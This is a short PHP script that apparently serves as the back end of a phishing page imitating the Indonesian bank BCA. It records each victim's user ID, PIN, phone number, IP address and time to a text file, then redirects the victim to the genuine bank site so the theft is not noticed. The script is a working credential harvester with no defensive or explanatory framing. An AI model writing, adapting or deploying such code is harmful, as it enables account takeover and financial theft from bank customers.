<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userid = htmlspecialchars($_POST['userid']);
    $pin = htmlspecialchars($_POST['pin']);
    $hp = htmlspecialchars($_POST['hp']);
    $ip = $_SERVER['REMOTE_ADDR'];
    $waktu = date("Y-m-d H:i:s");

    $log = "Waktu: {$waktu} | IP: {$ip} | User ID: {$userid} | PIN: {$pin} | No HP: {$hp}\n";

    file_put_contents("result.txt", $log, FILE_APPEND);

    header("Location: https://www.bca.co.id");
    exit();
}
?>
